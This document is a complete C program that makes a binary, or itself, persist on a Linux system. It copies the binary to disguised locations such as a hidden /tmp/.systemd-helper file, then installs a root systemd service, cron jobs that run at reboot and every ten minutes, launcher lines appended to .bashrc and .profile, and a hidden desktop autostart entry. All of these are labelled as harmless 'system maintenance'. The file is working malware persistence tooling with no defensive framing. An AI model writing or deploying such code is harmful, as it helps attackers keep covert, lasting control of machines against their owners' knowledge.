#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#include <pwd.h>
#include <errno.h>

#define MAX_PATH 1024

// Function prototypes
int create_systemd_service(const char *binary_path);
int create_cron_job(const char *binary_path);
int create_bashrc_entry(const char *binary_path);
int create_autostart_entry(const char *binary_path);
int copy_to_system_location(const char *source_path, char *dest_path);

int main(int argc, char *argv[]) {
    char binary_path[MAX_PATH];
    char system_binary_path[MAX_PATH];
    int success_count = 0;
    
    // Get the path to the binary to persist
    if (argc > 1) {
        strncpy(binary_path, argv[1], MAX_PATH - 1);
        binary_path[MAX_PATH - 1] = '\0';
    } else {
        // Default to self
        if (readlink("/proc/self/exe", binary_path, MAX_PATH - 1) == -1) {
            fprintf(stderr, "Error: Cannot determine binary path\n");
            return 1;
        }
        binary_path[MAX_PATH - 1] = '\0';
    }
    
    printf("Setting up persistence for: %s\n", binary_path);
    
    // Copy binary to a system location
    if (copy_to_system_location(binary_path, system_binary_path) == 0) {
        printf("[+] Binary copied to: %s\n", system_binary_path);
        strcpy(binary_path, system_binary_path);
    } else {
        printf("[-] Failed to copy binary to system location, using original path\n");
    }
    
    // Try multiple persistence methods
    
    // 1. systemd service (requires root)
    if (create_systemd_service(binary_path) == 0) {
        printf("[+] systemd service created\n");
        success_count++;
    } else {
        printf("[-] Failed to create systemd service\n");
    }
    
    // 2. cron job
    if (create_cron_job(binary_path) == 0) {
        printf("[+] Cron job created\n");
        success_count++;
    } else {
        printf("[-] Failed to create cron job\n");
    }
    
    // 3. .bashrc entry
    if (create_bashrc_entry(binary_path) == 0) {
        printf("[+] .bashrc entry created\n");
        success_count++;
    } else {
        printf("[-] Failed to create .bashrc entry\n");
    }
    
    // 4. Desktop autostart
    if (create_autostart_entry(binary_path) == 0) {
        printf("[+] Desktop autostart entry created\n");
        success_count++;
    } else {
        printf("[-] Failed to create desktop autostart entry\n");
    }
    
    printf("\nPersistence setup completed: %d/4 methods successful\n", success_count);
    
    return (success_count > 0) ? 0 : 1;
}

int copy_to_system_location(const char *source_path, char *dest_path) {
    const char *system_locations[] = {
        "/usr/local/bin/systemd-helper",
        "/tmp/.systemd-helper",
        "/var/tmp/.systemd-helper",
        NULL
    };
    
    FILE *source, *dest;
    char buffer[4096];
    size_t bytes;
    
    source = fopen(source_path, "rb");
    if (!source) {
        return -1;
    }
    
    // Try each system location
    for (int i = 0; system_locations[i] != NULL; i++) {
        dest = fopen(system_locations[i], "wb");
        if (dest) {
            // Copy file
            fseek(source, 0, SEEK_SET);
            while ((bytes = fread(buffer, 1, sizeof(buffer), source)) > 0) {
                if (fwrite(buffer, 1, bytes, dest) != bytes) {
                    fclose(dest);
                    fclose(source);
                    unlink(system_locations[i]);
                    continue;
                }
            }
            fclose(dest);
            
            // Set executable permissions
            if (chmod(system_locations[i], 0755) == 0) {
                strcpy(dest_path, system_locations[i]);
                fclose(source);
                return 0;
            }
            
            unlink(system_locations[i]);
        }
    }
    
    fclose(source);
    return -1;
}

int create_systemd_service(const char *binary_path) {
    FILE *service_file;
    const char *service_content = 
        "[Unit]\n"
        "Description=System Helper Service\n"
        "After=network.target\n"
        "\n"
        "[Service]\n"
        "Type=simple\n"
        "ExecStart=%s\n"
        "Restart=always\n"
        "RestartSec=10\n"
        "User=root\n"
        "\n"
        "[Install]\n"
        "WantedBy=multi-user.target\n";
    
    const char *service_locations[] = {
        "/etc/systemd/system/systemd-helper.service",
        "/usr/lib/systemd/system/systemd-helper.service",
        NULL
    };
    
    // Try to create service file
    for (int i = 0; service_locations[i] != NULL; i++) {
        service_file = fopen(service_locations[i], "w");
        if (service_file) {
            fprintf(service_file, service_content, binary_path);
            fclose(service_file);
            
            // Try to enable the service
            system("systemctl daemon-reload 2>/dev/null");
            system("systemctl enable systemd-helper.service 2>/dev/null");
            system("systemctl start systemd-helper.service 2>/dev/null");
            
            return 0;
        }
    }
    
    return -1;
}

int create_cron_job(const char *binary_path) {
    char cron_entry[MAX_PATH + 100];
    char cron_file[MAX_PATH];
    FILE *cron_fp;
    
    // Create cron entry
    snprintf(cron_entry, sizeof(cron_entry), 
             "# System maintenance job\n"
             "@reboot %s >/dev/null 2>&1\n"
             "*/10 * * * * %s >/dev/null 2>&1\n", 
             binary_path, binary_path);
    
    // Try user crontab first
    struct passwd *pw = getpwuid(getuid());
    if (pw) {
        snprintf(cron_file, sizeof(cron_file), "/var/spool/cron/crontabs/%s", pw->pw_name);
        cron_fp = fopen(cron_file, "a");
        if (cron_fp) {
            fprintf(cron_fp, "%s", cron_entry);
            fclose(cron_fp);
            return 0;
        }
        
        // Alternative cron location
        snprintf(cron_file, sizeof(cron_file), "/var/spool/cron/%s", pw->pw_name);
        cron_fp = fopen(cron_file, "a");
        if (cron_fp) {
            fprintf(cron_fp, "%s", cron_entry);
            fclose(cron_fp);
            return 0;
        }
    }
    
    // Try system cron
    cron_fp = fopen("/etc/cron.d/systemd-helper", "w");
    if (cron_fp) {
        fprintf(cron_fp, "# System maintenance\n");
        fprintf(cron_fp, "@reboot root %s >/dev/null 2>&1\n", binary_path);
        fprintf(cron_fp, "*/10 * * * * root %s >/dev/null 2>&1\n", binary_path);
        fclose(cron_fp);
        return 0;
    }
    
    return -1;
}

int create_bashrc_entry(const char *binary_path) {
    char bashrc_path[MAX_PATH];
    FILE *bashrc_file;
    struct passwd *pw = getpwuid(getuid());
    
    if (!pw) return -1;
    
    snprintf(bashrc_path, sizeof(bashrc_path), "%s/.bashrc", pw->pw_dir);
    
    bashrc_file = fopen(bashrc_path, "a");
    if (!bashrc_file) return -1;
    
    fprintf(bashrc_file, "\n# System maintenance\n");
    fprintf(bashrc_file, "if [ -f \"%s\" ]; then\n", binary_path);
    fprintf(bashrc_file, "    nohup \"%s\" >/dev/null 2>&1 &\n", binary_path);
    fprintf(bashrc_file, "fi\n");
    
    fclose(bashrc_file);
    
    // Also try .profile
    snprintf(bashrc_path, sizeof(bashrc_path), "%s/.profile", pw->pw_dir);
    bashrc_file = fopen(bashrc_path, "a");
    if (bashrc_file) {
        fprintf(bashrc_file, "\n# System maintenance\n");
        fprintf(bashrc_file, "if [ -f \"%s\" ]; then\n", binary_path);
        fprintf(bashrc_file, "    nohup \"%s\" >/dev/null 2>&1 &\n", binary_path);
        fprintf(bashrc_file, "fi\n");
        fclose(bashrc_file);
    }
    
    return 0;
}

int create_autostart_entry(const char *binary_path) {
    char autostart_dir[MAX_PATH];
    char desktop_file[MAX_PATH];
    FILE *desktop_fp;
    struct passwd *pw = getpwuid(getuid());
    
    if (!pw) return -1;
    
    // Create autostart directory if it doesn't exist
    snprintf(autostart_dir, sizeof(autostart_dir), "%s/.config/autostart", pw->pw_dir);
    mkdir(autostart_dir, 0755);
    
    snprintf(desktop_file, sizeof(desktop_file), "%s/systemd-helper.desktop", autostart_dir);
    
    desktop_fp = fopen(desktop_file, "w");
    if (!desktop_fp) return -1;
    
    fprintf(desktop_fp, "[Desktop Entry]\n");
    fprintf(desktop_fp, "Type=Application\n");
    fprintf(desktop_fp, "Name=System Helper\n");
    fprintf(desktop_fp, "Comment=System maintenance utility\n");
    fprintf(desktop_fp, "Exec=%s\n", binary_path);
    fprintf(desktop_fp, "Hidden=true\n");
    fprintf(desktop_fp, "NoDisplay=true\n");
    fprintf(desktop_fp, "X-GNOME-Autostart-enabled=true\n");
    
    fclose(desktop_fp);
    
    return 0;
}